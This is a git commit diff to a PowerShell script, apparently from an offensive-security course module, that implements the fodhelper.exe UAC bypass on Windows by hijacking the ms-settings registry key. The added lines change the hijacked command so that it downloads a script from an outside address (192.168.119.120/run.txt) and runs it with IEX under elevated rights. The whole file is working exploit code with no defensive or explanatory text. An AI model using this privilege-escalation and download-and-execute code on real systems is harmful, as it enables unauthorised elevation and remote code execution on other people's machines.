d08acd70293a0d53bccbbe66478a251e01737c10
Emmanouil Perselis <okmanolos1@hotmail.com>
2020-12-09 21:33:34 +0100

    Update UAC_Bypass_fodhelper.ps1

--- module_7/UAC_Bypass_fodhelper.ps1
+++ module_7/UAC_Bypass_fodhelper.ps1
@@ -1,3 +1,10 @@
 New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
 New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 C:\Windows\System32\fodhelper.exe
+
+##################### OR #####################
+
+
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" -Force
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+C:\Windows\System32\fodhelper.exe
